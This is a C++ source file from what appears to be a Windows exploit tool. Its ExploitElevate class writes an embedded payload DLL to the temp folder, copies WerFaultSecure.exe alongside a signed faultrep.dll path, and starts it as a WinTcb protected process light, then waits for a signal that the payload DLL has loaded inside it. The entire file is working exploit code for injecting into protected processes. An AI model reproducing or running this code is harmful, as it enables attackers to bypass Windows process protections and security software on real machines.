#include "ExploitElevate.h"
#include "globaldef.h"
#include "Utils.h"
#include "resource.h"
#include <strsafe.h>

ExploitElevate::ExploitElevate()
{
    _WorkspacePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _PayloadDllFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _SignedDllFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _ExeFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    _DllLoadEventHandle = NULL;
    _ProtectedProcessHandle = NULL;
}

ExploitElevate::~ExploitElevate()
{
    //
    // Wait for the protected process to terminate to make sure all file handles
    // are closed before attempting to delete them.
    //
    if (_ProtectedProcessHandle) WaitForSingleObject(_ProtectedProcessHandle, TIMEOUT);

    //
    // Try to delete the files that were created in the workspace directory.
    //
    if (!DeleteFileW(_PayloadDllFilePath)) WARNING(L"Failed to delete file: %ws", _PayloadDllFilePath);
    if (!DeleteFileW(_SignedDllFilePath)) WARNING(L"Failed to delete file: %ws", _SignedDllFilePath);
    if (!DeleteFileW(_ExeFilePath)) WARNING(L"Failed to delete file: %ws", _ExeFilePath);

    //
    // Free buffers and close object handles.
    //
    if (_WorkspacePath) LocalFree(_WorkspacePath);
    if (_PayloadDllFilePath) LocalFree(_PayloadDllFilePath);
    if (_SignedDllFilePath) LocalFree(_SignedDllFilePath);
    if (_ExeFilePath) LocalFree(_ExeFilePath);
    if (_DllLoadEventHandle) CloseHandle(_DllLoadEventHandle);
    if (_ProtectedProcessHandle) CloseHandle(_ProtectedProcessHandle);
}

BOOL ExploitElevate::Initialize()
{
    BOOL bResult = FALSE;
    LPWSTR pwszDllLoadEventName = NULL;

    EXIT_ON_ERROR(!this->InitializeWorkspacePath());
    EXIT_ON_ERROR(!this->InitializeFilePaths());
    EXIT_ON_ERROR(!this->PrepareWorkspaceFiles());
    EXIT_ON_ERROR(!(pwszDllLoadEventName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));

    swprintf_s(pwszDllLoadEventName, MAX_PATH, L"Global\\%ws", STR_IPC_WERFAULT_LOAD_EVENT_NAME);

    EXIT_ON_ERROR((this->_DllLoadEventHandle = CreateEventW(NULL, TRUE, FALSE, pwszDllLoadEventName)) == NULL);

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);

    if (pwszDllLoadEventName) LocalFree(pwszDllLoadEventName);

    return bResult;
}

LPWSTR ExploitElevate::GetPayloadDllFilePath()
{
    return this->_PayloadDllFilePath;
}

LPWSTR ExploitElevate::GetSignedDllFilePath()
{
    return this->_SignedDllFilePath;
}

BOOL ExploitElevate::Run()
{
    BOOL bResult = FALSE;
    PS_PROTECTION p;
    PROCESS_INFORMATION pi;

    p.Type = PsProtectedTypeProtectedLight;
    p.Signer = PsProtectedSignerWinTcb;

    EXIT_ON_ERROR(!Utils::CreateProtectedProcess(this->_ExeFilePath, p, &pi));
    this->_ProtectedProcessHandle = pi.hProcess;
    EXIT_ON_ERROR(WaitForSingleObject(this->_DllLoadEventHandle, TIMEOUT) != WAIT_OBJECT_0);

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);
    if (pi.hThread) CloseHandle(pi.hThread);

    return bResult;
}

BOOL ExploitElevate::InitializeWorkspacePath()
{
    BOOL bResult = FALSE;

    EXIT_ON_ERROR(!GetTempPathW(MAX_PATH, this->_WorkspacePath));

    bResult = TRUE;

cleanup:
    DEBUG(L"Workspace path: %ws | Result: %d", this->_WorkspacePath, bResult);

    return bResult;
}

BOOL ExploitElevate::InitializeFilePaths()
{
    BOOL bResult = FALSE;

    // Temp file for the payload DLL
    EXIT_ON_ERROR(!GetTempFileNameW(this->_WorkspacePath, L"", 0, this->_PayloadDllFilePath));

    // Temp path for the faultrep.dll DLL
    swprintf_s(this->_SignedDllFilePath, MAX_PATH, L"%ws%ws", this->_WorkspacePath, STR_CACHE_SIGNED_DLL_NAME);

    // Temp path for the WerFaultSecure.exe executable
    swprintf_s(this->_ExeFilePath, MAX_PATH, L"%ws%ws", this->_WorkspacePath, STR_SIGNED_EXE_NAME);

    bResult = TRUE;

cleanup:
    DEBUG(L"Payload path: %ws | Signed DLL path: %ws | EXE path: %ws | Result: %d", this->_PayloadDllFilePath, this->_SignedDllFilePath, this->_ExeFilePath, bResult);

    return bResult;
}

BOOL ExploitElevate::PrepareWorkspaceFiles()
{
    BOOL bResult = FALSE;
    LPVOID pDllData;
    DWORD dwDllSize, dwBytesWritten;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LPWSTR pwszExeSystemPath = NULL;

    // Write payload DLL in a temp file in the workspace directory
    EXIT_ON_ERROR(!Utils::GetEmbeddedResource(IDR_RCDATA1, &pDllData, &dwDllSize));
    EXIT_ON_ERROR((hFile = CreateFileW(this->_PayloadDllFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!WriteFile(hFile, pDllData, dwDllSize, &dwBytesWritten, NULL));

    // Copy WerFaultSecure.exe to workspace directory
    EXIT_ON_ERROR(!(pwszExeSystemPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetSystemDirectoryW(pwszExeSystemPath, MAX_PATH));
    swprintf_s(pwszExeSystemPath, MAX_PATH, L"%ws\\%ws", pwszExeSystemPath, STR_SIGNED_EXE_NAME);
    EXIT_ON_ERROR(!CopyFileW(pwszExeSystemPath, this->_ExeFilePath, FALSE));

    bResult = TRUE;

cleanup:
    DEBUG(L"Result: %d", bResult);

    if (hFile && hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (pwszExeSystemPath) LocalFree(pwszExeSystemPath);

    return bResult;
}
